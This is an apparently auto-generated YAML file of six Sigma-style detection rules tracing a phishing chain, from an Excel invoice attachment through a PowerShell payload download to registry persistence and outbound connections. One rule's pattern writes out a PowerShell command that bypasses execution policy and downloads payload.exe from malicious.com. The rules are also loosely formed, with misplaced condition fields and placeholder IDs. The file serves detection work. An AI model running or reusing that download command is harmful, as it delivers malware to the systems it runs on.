```yaml
- title: Initial Access via Email Detection
  id: 123e4567-e89b-12d3-a456-426614174000
  description: Monitor for email events indicating suspicious patterns. Specifically, look for emails with the subject line "Important Update" and attachments named "Invoice_2023.xlsx".
  status: production
  author: auto-generated
  date: 2023-10-01
  logsource:
    category: custom
    product: windows
  detection:
    selection:
      subject: "Important Update"
      attachment: "Invoice_2023.xlsx"
  condition: selection
  tags:
    - ATT&CK ID: T1566
    - tactic: Initial Access
  level: high

---
- title: Opening the Malicious Attachment Detection
  id: 123e4567-e89b-12d3-a456-426614174001
  description: Identify instances where Microsoft Excel is executed with command-line arguments indicating macro execution.
  status: production
  author: auto-generated
  date: 2023-10-01
  logsource:
    category: custom
    product: windows
  detection:
    selection:
      srcNode.Image: "excel.exe"
      srcNode.Cmdline: "*C:\\Users\\User\\Downloads\\Invoice_2023.xlsx /m*"
  condition: selection
  tags:
    - ATT&CK ID: T1203
    - tactic: Initial Access
  level: high

---
- title: Macro Execution and Payload Download Detection
  id: 123e4567-e89b-12d3-a456-426614174002
  description: Monitor for PowerShell execution initiated by Excel.
  status: production
  author: auto-generated
  date: 2023-10-01
  logsource:
    category: custom
    product: windows
  detection:
    selection:
      srcNode.Image: "powershell.exe"
      srcNode.Cmdline: "*-ExecutionPolicy Bypass -Command \"Invoke-WebRequest -Uri 'http://malicious.com/payload.exe' -OutFile 'C:\\Users\\User\\AppData\\Local\\Temp\\payload.exe'\"*"
  condition: selection
  tags:
    - ATT&CK ID: T1059
    - tactic: Execution
  level: high

---
- title: Execution of the Malicious Payload Detection
  id: 123e4567-e89b-12d3-a456-426614174003
  description: Identify events where the payload executable is executed.
  status: production
  author: auto-generated
  date: 2023-10-01
  logsource:
    category: custom
    product: windows
  detection:
    selection:
      srcNode.Image: "C:\\Users\\User\\AppData\\Local\\Temp\\payload.exe"
      relation: "Process Create"
  condition: selection
  tags:
    - ATT&CK ID: T1203
    - tactic: Execution
  level: high

---
- title: Establishing Persistence Detection
  id: 123e4567-e89b-12d3-a456-426614174004
  description: Monitor for registry modifications that add or modify entries in HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run.
  status: production
  author: auto-generated
  date: 2023-10-01
  logsource:
    category: custom
    product: windows
  detection:
    selection:
      srcNode.Image: "reg.exe"
      dstNode.Key: "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
  condition: selection
  tags:
    - ATT&CK ID: T1547
    - tactic: Persistence
  level: medium

---
- title: Lateral Movement and Data Exfiltration Detection
  id: 123e4567-e89b-12d3-a456-426614174005
  description: Monitor for unusual outbound network connections initiated by PowerShell.
  status: production
  author: auto-generated
  date: 2023-10-01
  logsource:
    category: custom
    product: windows
  detection:
    selection:
      srcNode.Image: "powershell.exe"
      dstNode.Dstaddress: "external_ip"
  condition: selection
  tags:
    - ATT&CK ID: T1071
    - tactic: Exfiltration
  level: high
```